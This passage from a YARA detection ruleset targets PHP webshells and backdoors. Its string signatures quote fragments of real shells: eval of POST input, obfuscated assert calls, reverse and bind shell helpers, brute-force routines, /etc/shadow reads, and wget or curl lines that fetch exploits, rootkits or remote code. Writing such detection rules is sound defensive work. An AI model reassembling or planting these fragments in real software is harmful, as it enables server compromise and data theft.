      $s13 = "$V='$i]~^,$f);if($e)~^{$k=$~^kh~^.$kf;ob_st~^art()~^;@e~^val(@gzunco~^~^mpress(@x(~^@base6~^';" fullword ascii
      $s14 = "$N='unt($m[~^1]);~^$z+~^+)$p.=$q[$m~^[2][~^$z]~^]~^;if(strpo~^s($p,$h)===0~^){~^$s[$i]=~^~^\"';" fullword ascii
      $s15 = "$g=str_replace('~^','',$r.$E.$f.$W.$t.$y.$T.$w.$N.$A.$V.$l.$Q.$R);" fullword ascii
      $s16 = "$M=str_replace('fW','','crfWfWfWeafWfWfWte_function');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_98d13eea07f57d3b4a2c5079cc27659dde6ebfad
{
   meta:
      description = "php17 - file 98d13eea07f57d3b4a2c5079cc27659dde6ebfad.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9ca48c9df4cd95c76600fc0ae6b525c7adc9edfb606ca5fe24aab23d952de256"
   strings:
      $x1 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br" fullword ascii
      $x2 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $x3 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x4 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(\\'Php\\',null" fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true;" fullword ascii
      $x6 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br>' . " ascii
      $s7 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $s8 = "echo '<br/><span>posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",this.param1.v" fullword ascii
      $s9 = "wsoSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s10 = "t.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>\";" fullword ascii
      $s11 = "if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s12 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $s13 = "setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);" fullword ascii
      $s14 = "wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?\"yes <a href='#' onclick='g(\\\"FilesTools\\\", \\\"/etc/\\" fullword ascii
      $s15 = "lse{g(null,null,this.cmd.value,this.show_errors.checked?1:\\'\\');} return false;\"><select name=alias>';" fullword ascii
      $s16 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))" fullword ascii
      $s17 = "function wsoBruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s18 = "$out = wsoEx(\"perl /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" 1>/dev/null 2>&1 &\");" fullword ascii
      $s19 = "TP_HOST'] . \" - Cyb3rD0g \" . WSO_VERSION .\"</title>" fullword ascii
      $s20 = "wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?\"yes <a href='#' onclick='g(\\\"FilesTools\\\", \\\"/etc/\\" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_5e30aaf3a47521d99232b5148a53ecd3fec43c9b
{
   meta:
      description = "php17 - file 5e30aaf3a47521d99232b5148a53ecd3fec43c9b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "374dfef917872d886c316b864558413d5c11988fc148c3a0819090a67ee32145"
   strings:
      $x1 = "elseif(isset($_REQUEST['pgsqlcon']) && ($con = pg_connect(\"host=$sqlhost user=$sqluser password=$sqlpass port=$sqlport\"))){" fullword ascii
      $x2 = "elseif(isset($_REQUEST['pgsqlcon']) && ($con = pg_connect(\"host=$sqlhost user=$sqluser password=$sqlpass port=$sqlport\")" fullword ascii
      $s3 = "$rspesanb = \"Ejecutar &#39;  nc -l -v -p <i>port</i>  &#39; En tu computador presiona &#39;  Ir !  &#39; Boton\";" fullword ascii
      $s4 = "else $s_auth = true; // $s_pass variable (password) is empty , go ahead, no login page" fullword ascii
      $s5 = "setcookie(\"MetalSoftTeam\",$login,time() - 3600*24*7);" fullword ascii
      $s6 = "<?php if(isset($_REQUEST['cmd'])) echo \"if(document.getElementById('cmd')) document.getElementById('cmd').focus();\"; ?>" fullword ascii
      $s7 = "// http://www.kryogenix.org/code/browser/sorttable/ - this makes the tables sortable" fullword ascii
      $s8 = "// resources $xback_pl $xbind_pl $xback_c $xbind_c $xmulti_py $wmulti_c... this was used with bind and reverse shell" fullword ascii
      $s9 = "if(!$s_win) $rsres = rs($s_win, cp($d),  \"xback_bin\" ,$xback_c, $rstarget);" fullword ascii
      $s10 = "if(!$s_win) $rsres = rs($s_win, cp($d),  \"xbind_bin\" ,$xbind_c, $rstarget);" fullword ascii
      $s11 = "elseif(isset($_REQUEST['oraclecon']) && ($con = oci_connect($sqluser,$sqlpass,$hostandport))){" fullword ascii
      $s12 = "elseif(isset($_REQUEST['mssqlcon']) && ($con = mssql_connect($hostandport,$sqluser,$sqlpass))){" fullword ascii
      $s13 = "if(isset($_REQUEST['mysqlcon']) && ($con = mysql_connect($hostandport,$sqluser,$sqlpass))){" fullword ascii
      $s14 = "setcookie(\"MetalSoftTeam\",md5($login),time() + 3600*24*7);" fullword ascii
      $s15 = "$descriptorspec = array(0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));" fullword ascii
      $s16 = "<p class=\"footer\">Fail.root[at]Hotmail.com | MetalSoft Hackers Team &copy;</p>" fullword ascii
      $s17 = "else $rsres = rs($s_win, cp($d),  \"xbind_bin\" ,$wmulti_c, $rstarget);" fullword ascii
      $s18 = "else $rsres = rs($s_win, cp($d),  \"xback_bin\" ,$wmulti_c, $rstarget);" fullword ascii
      $s19 = "$rsres = rs($s_win, cp($d),  \"xbind_pl\" ,$xbind_pl, $rstarget);" fullword ascii
      $s20 = "$rsres = rs($s_win, cp($d),  \"xbind_py\" ,$xmulti_py, $rstarget);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_9da47055cc121171c1d820bc9185e69f0d9de1f3
{
   meta:
      description = "php17 - file 9da47055cc121171c1d820bc9185e69f0d9de1f3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6939898da48e7b6607e02143c78d3201ae21230a8e49225d1aaca646a42d6df0"
   strings:
      $x1 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x2 = "elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - FaTaL Shell v1.0</title><meta http-equiv=\"Content-Type\" content=\"text" ascii
      $x4 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - FaTaL Shell v1.0</title><meta http-equiv=\"Content-Type\" content=\"text" ascii
      $s5 = "case fetch:shell(which('fetch').\" -o \".$_POST['filename'].\" -p \".$_POST['urldown'].\"\");break;" fullword ascii
      $s6 = "case curl:shell(which('curl').\" \".$_POST['urldown'].\" -o \".$_POST['filename'].\"\");break;" fullword ascii
      $s7 = "$act=array('viewer','editor','upload','shell','phpeval','download','delete','deletedir');//here added new actions" fullword ascii
      $s8 = "case lynx:shell(which('lynx').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");break;" fullword ascii
      $s9 = "case links:shell(which('links').\" -source \".$_POST['urldown'].\" > \".$_POST['filename'].\"\");break;" fullword ascii
      $s10 = "elseif(@is_resource($f = @popen($cmd,\"r\"))){$ret = \"\";while(!@feof($f)) { $ret .= @fread($f,1024); }@pclose($f);}" fullword ascii
      $s11 = "if(function_exists('exec')){@exec($cmd,$ret);$ret = join(\"\\n\",$ret);}" fullword ascii
      $s12 = "elseif(function_exists('shell_exec')){$ret = @shell_exec($cmd);}" fullword ascii
      $s13 = "case wget:shell(which('wget').\" \".$_POST['urldown'].\" -O \".$_POST['filename'].\"\");break;" fullword ascii
      $s14 = "if(!isset($_POST['filename'])) $uploadfile = $dirupload.basename($_FILES['file']['name']); else " fullword ascii
      $s15 = ".starhack.org\">COPYRIGHT BY StarHack.oRg <?=$version;?></a></td></tr></table></tr></td></table><?=$footer;?>" fullword ascii
      $s16 = "; charset=windows-1254\">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';" fullword ascii
      $s17 = "$content.=\"<table cellSpacing=0 border=1 style=\\\"border-color:black;\\\" cellPadding=0 width=\\\"100%\\\">\";" fullword ascii
      $s18 = "linkfile.'\\';document.reqs.dir.value=\\''.$dir.'\\'; document.reqs.submit();\" title=\"Bu Dosyayi Sil\">X</a></td></tr>'; " fullword ascii
      $s19 = "(@ini_get('safe_mode')==\"1\" ? $safe_mode=\"ON\" : $safe_mode=\"OFF(Rootla_Beni:)\");" fullword ascii
      $s20 = "if(isset($_POST['phpev']))$content.=eval($_POST['phpev']);}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule sig_91c244a84db09f2dca06b6b1d1582cba
{
   meta:
      description = "php17 - file 91c244a84db09f2dca06b6b1d1582cba.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "313d2696cd35537bd60701d9e295b169890bbed7fc56c247d232a3f832c19a80"
   strings:
      $x1 = "* @copyright  Copyright (c) 2006-2015 X.commerce, Inc. (http://www.magento.com)" fullword ascii
      $x2 = "* needs please refer to http://www.magento.com for more information." fullword ascii
      $s3 = "* to license@magento.com so we can send you a copy immediately." fullword ascii
      $s4 = "shell_exec('touch -r '.$path.$file.' '.$path.$name);" fullword ascii
      $s5 = "shell_exec('curl -o '.$path.$name.' '.$link);" fullword ascii
      $s6 = "* @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)" fullword ascii
      $s7 = "* Main Config" fullword ascii
      $s8 = "* Please dont ever edit this code below" fullword ascii
      $s9 = "#define('COMPILER_INCLUDE_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR.'src');" fullword ascii
      $s10 = "#define('COMPILER_COLLECT_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR.'stat');" fullword ascii
      $s11 = "$file_b = 'AddressController.php';" fullword ascii
      $s12 = "$name_b = 'AccountController.php';" fullword ascii
      $s13 = "$name_c = 'Session.php';" fullword ascii
      $s14 = "$file_c = 'Config.php';" fullword ascii
      $s15 = "$dir  = getcwd();" fullword ascii
      $s16 = "$link = $b64('aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcv');" fullword ascii
      $s17 = "$file_a = 'Abstract.php';" fullword ascii
      $s18 = "$name_d = 'Onepage.php';" fullword ascii
      $s19 = "$file_d = 'Abstract.php';" fullword ascii
      $s20 = "$b64  = \"base\".\"64\".\"_\".\"de\".\"code\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule a2baa41f5667eb2a3ad57003105e57ed0000af38
{
   meta:
      description = "php17 - file a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $x1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $x2 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x3 = "<input type='submit' value='fakenamegenerator.com' onclick=\\\"document.hf.action='http://www.fakenamegenerator.com/';" fullword ascii
      $x4 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
      $x5 = "if( $this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\") ) return true;" fullword ascii
      $x6 = "$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $x7 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x8 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x9 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x10 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x11 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $x12 = "'<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname" ascii
      $s13 = "showSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s14 = "<input type='submit' value='fopo.com.ar' onclick=\\\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\\\"><br>" fullword ascii
      $s15 = "<input type='submit' value='toolki.com' onclick=\\\"document.hf.action='http://toolki.com/';document.hf.submit()\\\"><br>" fullword ascii
      $s16 = "t.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>\";" fullword ascii
      $s17 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s18 = "$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes(\"\\n$ \".$_POST['p1'].\"\\n\".ex($_POST['p1']),\"\\n\\r\\t\\'\\0\"));" fullword ascii
      $s19 = "setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);" fullword ascii
      $s20 = "type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=ch" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule sig_5358b9611032c704f509673a35565eca7b36d9bb
{
   meta:
      description = "php17 - file 5358b9611032c704f509673a35565eca7b36d9bb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a5688bae5f2fecfea22bc43d20390dedb375d5f8278faa322be60388cb899a0b"
   strings:
      $x1 = "$str = \"host='\" . $ip . \"' port='\" . $port . \"' user='\" . $login . \"' password='\" . $pass . \"' dbname=postgres\";" fullword ascii
      $x2 = "\"findconfig * files\" => \"find / -typef - name\\\"config*\\\"\", \"find config* files in current dir\" => \"find . -type f -na" ascii
      $x3 = "echo '<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><" ascii
      $x4 = "if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $x5 = "if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x6 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) ]) || ($_COOKIE[md5($_SERVER['HTTP_HOST']) ] != $auth_pass)) wsoLogin();" fullword ascii
      $x7 = ". ' < td > < nobr > ' . substr(@php_uname(), 0, 120) . ' < ahref = \"' . $explink . '\"target = _blank > [exploit - db . co" fullword ascii
      $x8 = "if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump'" fullword ascii
      $x9 = "if ($this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\")) return true;" fullword ascii
      $x10 = "foreach ($downloaders as $item) if (wsoWhich($item)) $temp[] = $item;" fullword ascii
      $x11 = "if (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)) WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);" fullword ascii
      $x12 = "$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');" fullword ascii
      $x13 = "if (empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);" fullword ascii
      $x14 = "$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-m" fullword ascii
      $s15 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $s16 = "wsoSecParam('Downloaders', implode(', ', $temp));" fullword ascii
      $s17 = "if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_" fullword ascii
      $s18 = "for ($i = strlen($_POST['p3']) - 1;$i >= 0;--$i) $perms+= (int)$_POST['p3'][$i] * pow(8, (strlen($_POST['p3']) - $i - 1));" fullword ascii
      $s19 = "if ($_POST['p3'] > 1) echo \" <a href=# onclick='st(\\\"\" . $_POST['p2'] . '\", ' . ($_POST['p3'] - 1) . \")'>&lt; Prev</a>\";" fullword ascii
      $s20 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubm" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}

rule sig_99754106633f94d350db34d548d6091a
{
   meta:
      description = "php17 - file 99754106633f94d350db34d548d6091a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7728f463c0a51beb209f57662d104263852cfeb2dae58e5903eea3e2bcaea904"
   strings:
      $s1 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('Status:404');Else/**/$K($M);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_19da583dec75230f6b8b5444ef75f9a0ffb708ab
{
   meta:
      description = "php17 - file 19da583dec75230f6b8b5444ef75f9a0ffb708ab.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9ec94adfdb48ed76e07c3ffe40bacbae8b098a766c04b80f81aac81b4fdbb5fc"
   strings:
      $s1 = "<?php" fullword ascii
      $s2 = "726f743133" ascii
      $s3 = "5f717270627172" ascii
      $s4 = "6f6e66723634" ascii
      $s5 = ".='5f717270627172';$????????.='726f743133';$???????" fullword ascii
      $s6 = "='6f6e66723634';$?-" fullword ascii
      $s7 = "('|?2C'),$?" fullword ascii
      $s8 = "-??('|?2B');$??" fullword ascii
      $s9 = "if(!defined('lrwysyfg')){define('lrwysyfg',__FILE__);" fullword ascii
      $s10 = "ini_set(\"display_errors\", 0);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      all of them
}

rule sig_15febc7c452fb361fc5eca8e67711a86a9ee0b9e
{
   meta:
      description = "php17 - file 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
   strings:
      $x1 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
      $x2 = "function tpftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {" fullword ascii
      $x3 = "displaysecinfo(\"Kernel Version\",tpexec(\"sysctl -a | grep version\"));" fullword ascii
      $x4 = "elseif ( enabled(\"passthru\") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x5 = "elseif ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x6 = "if ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x7 = "\"<tr><td></td><td><input type=\\\"checkbox\\\" name=\\\"fqb_onlywithsh\\\" value=\\\"1\\\"> Users only with shell</td></tr>\"." fullword ascii
      $x8 = "echo(\"<center><b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $x9 = "elseif (is_callable('system') and !in_array('system',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $resu" fullword ascii
      $x10 = "elseif (is_callable('passthru') and !in_array('passthru',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd);" fullword ascii
      $x11 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
      $x12 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesiz" fullword ascii
      $x13 = "array(\"Downloaders?\",\"which wget curl w3m lynx fetch lwp-download\")," fullword ascii
      $x14 = "array(\"wget & run BindDoor\",\"wget \".$sh_mainurl.\"bind.tgz;tar -zxvf bind.tgz;./4877\")," fullword ascii
      $x15 = "srv_info(\"ID\",($win) ? get_current_user().\" (uid=\".getmyuid().\" gid=\".getmygid().\")\" : tpexec(\"id\"));" fullword ascii
      $x16 = "array(\"wget WIPELOGS PT1\",\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\")," fullword ascii
      $x17 = "if (!$fp) {return \"Local error: can't write update to \".__FILE__.\"! You may download tpshell.php manually <a href=\\\"\"." fullword ascii
      $s18 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> <input type=submit name=submit value=\"Execute\">" fullword ascii
      $s19 = "$logfile = $tmpdir_logs.\"tpsh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s20 = "<title>'.getenv(\"HTTP_HOST\").' - '.sh_name().'</title>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*) and all of them
}

rule sig_8b82d8a4aaf27d4282caa571b0b84518eb9b7fdc
{
   meta:
      description = "php17 - file 8b82d8a4aaf27d4282caa571b0b84518eb9b7fdc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a646a4404db43771fe60a80667057d98f8245a25653abc25b4c35ea2f217dfcb"
   strings:
      $s1 = "$content = 'helloworld';" fullword ascii
      $s2 = "if (fwrite ($fp, $content))" fullword ascii
      $s3 = "eval(str_rot13('riny($_CBFG[pzq]);'));" fullword ascii
      $s4 = "echo str_rot13('riny($_CBFG[pzq]);');" fullword ascii
      $s5 = "die (\"error\");" fullword ascii
      $s6 = "$filename = end(explode('/',$url));" fullword ascii
      $s7 = "$fp = fopen (\"$filename\",\"w\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _advancedLayout
{
   meta:
      description = "php17 - file _advancedLayout.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e0098a7f121874480ce853b29bfc82cf1556fee82be8bdde405d31a8b19047fd"
   strings:
      $s1 = "humhub\\modules\\admin\\widgets\\SettingsMenu::markAsActive(['/admin/setting/advanced']);" fullword ascii
      $s2 = "<?= Yii::t('AdminModule.setting', 'These settings refer to advanced topics of your social network.'); ?>" fullword ascii
      $s3 = "<?= humhub\\modules\\admin\\widgets\\AdvancedSettingMenu::widget(); ?>" fullword ascii
      $s4 = "<h4><?= Yii::t('AdminModule.setting', 'Advanced Settings'); ?></h4>" fullword ascii
      $s5 = "<?= $content; ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_0080_00ff
{
   meta:
      description = "php17 - file 0080_00ff.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a842417432823a0d58f97427727d0f8005685eff652ef28196c02f8bdbadbac9"
   strings:
      $s1 = "*     Note that the Turkic mappings do not maintain canonical equivalence without additional processing." fullword ascii
      $s2 = "$config['0080_00ff'][] = array('upper' => 223, 'status' => 'F', 'lower' => array(115, 115));" fullword ascii
      $s3 = "* Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s4 = "* CakePHP(tm) : Rapid Development Framework (http://cakephp.org)" fullword ascii
      $s5 = "* @see http://www.unicode.org/Public/UNIDATA/CaseFolding.txt" fullword ascii
      $s6 = "* @see http://www.unicode.org/Public/UNIDATA/UCD.html" fullword ascii
      $s7 = "* C: common case folding, common mappings shared by both simple and full mappings." fullword ascii
      $s8 = "*   - For Turkic languages (tr, az), this mapping can be used instead of the normal mapping for these characters." fullword ascii
      $s9 = "* @license       MIT License (http://www.opensource.org/licenses/mit-license.php)" fullword ascii
      $s10 = "* @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)" fullword ascii
      $s11 = "* The lower filed is an array of the decimal values that form the lower case version of a character." fullword ascii
      $s12 = "$config['0080_00ff'][] = array('upper' => 193, 'status' => 'C', 'lower' => array(225));" fullword ascii
      $s13 = "$config['0080_00ff'][] = array('upper' => 195, 'status' => 'C', 'lower' => array(227));" fullword ascii
      $s14 = "$config['0080_00ff'][] = array('upper' => 192, 'status' => 'C', 'lower' => array(224));" fullword ascii
      $s15 = "$config['0080_00ff'][] = array('upper' => 200, 'status' => 'C', 'lower' => array(232));" fullword ascii
      $s16 = "$config['0080_00ff'][] = array('upper' => 201, 'status' => 'C', 'lower' => array(233));" fullword ascii
      $s17 = "$config['0080_00ff'][] = array('upper' => 221, 'status' => 'C', 'lower' => array(253));" fullword ascii
      $s18 = "$config['0080_00ff'][] = array('upper' => 217, 'status' => 'C', 'lower' => array(249));" fullword ascii
      $s19 = "$config['0080_00ff'][] = array('upper' => 218, 'status' => 'C', 'lower' => array(250));" fullword ascii
      $s20 = "$config['0080_00ff'][] = array('upper' => 205, 'status' => 'C', 'lower' => array(237));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_074177d3eb6371e32c16c55a3b8f706b
{
   meta:
      description = "php17 - file 074177d3eb6371e32c16c55a3b8f706b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4a559425f55fd91596a8ad4c4caba2c2078900678b61b5097aca0b4b12cac605"
   strings:
      $s1 = "$D='y(iS\"/\",iS\"iS+\")iS,$ss($s[$i],iS0,$e)iS)),$k)))iS;$o=obiS_get_iSiScontents()iS;ob_eniSd_iScleaiSn();$d';" fullword ascii
      $s2 = "$Q='=basiSiSe64_encode(x(giSzcompress($o)iS,$k)iS);print(\"iS<$k>iS$d</iS$k>\");@siSessioniS_destroyiS();}}}}';" fullword ascii
      $s3 = "$p='ERViSEiSR;iS$rr=@$r[\"HTTiSP_REFEiSRER\"iS];$ra=@$r[iS\"iSHTTP_ACCEiSPT_LANGiSUAGE\"]iS;ifiS($rr&&$iSra){$';" fullword ascii
      $s4 = "$h='ll(iS\"/([\\\\w])iS[\\\\w-]+(iS?:;q=0.iS([iSiS\\\\d]))?,?/\",iS$riSa,iS$miS);if($q&&$m){@session_staiSrtiS(iS);$';" fullword ascii
      $s5 = "$W='_key_exiSists(iS$i,$s)){iS$siS[$i].=$piS;$e=iSiSstrpos($siS[$iiS]iS,$f);if($e){$k=$kh.$kiSf;ob_stiSiS';" fullword ascii
      $s6 = "$Z='art();@evaiSl(@giSzuniSiSciSompress(@x(@baseiS64_decodeiS(pregiS_riSeplace(ariSray(\"/_/\",\"/-/iS\"),arriSa';" fullword ascii
      $s7 = "$l='$kh=\"3481\"iS;iS$kf=\"iS9diS7b\";funiSctiSion x($t,$k){$c=strliSen($kiS);iSiS$l=strlen($tiS);$o=\"\";foiSr(iS$i=0iS';" fullword ascii
      $s8 = "$H='s=&iS$_SESSiSION;$ss=\"subsiSiStr\";$sliS=\"stiSrtolower\";$i=$miS[1][iS0].iS$m[iS1][iS1];$h=$sl($ss(md5iS';" fullword ascii
      $s9 = "$X='($i.iS$kh),0,iS3)iS);$f=$sl(iS$ssiS(iSmd5($i.$kf),iS0iS,iS3));$p=\"\";foriS($z=1;$z<couiSiSnt($m[1]);$z+i';" fullword ascii
      $s10 = "$E=';$i<$l;){foriS($j=0;(iS$j<$ciS&&iS$i<$l);$jiSiS++,iS$i++){$o.=$t{$iiS}^$k{$j}iS;iS}iS}riSeturn $o;}$r=$_S';" fullword ascii
      $s11 = "$g='u=paiSrse_iSiSurl($rr);pariSse_siStr($u[\"queriSy\"],$iSq)iS;iSiS$q=array_iSvaluiSes($q);pregiS_match_a';" fullword ascii
      $s12 = "$u='S+)$p.iS=$iSq[$m[2][$z]iS]iSiS;if(strpos(iS$p,$h)===0iS){$s[$iiS]=iS\"\";$iSpiS=$ss($p,3);}if(arriSiSay';" fullword ascii
      $s13 = "$O=str_replace('iS','',$l.$E.$p.$g.$h.$H.$X.$u.$W.$Z.$D.$Q);" fullword ascii
      $s14 = "$L=str_replace('x','','crexxatex_fxxunxction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_2017_11_08_110356_create_user_profiles_table
{
   meta:
      description = "php17 - file 2017_11_08_110356_create_user_profiles_table.php"
      author = "WatcherLab"
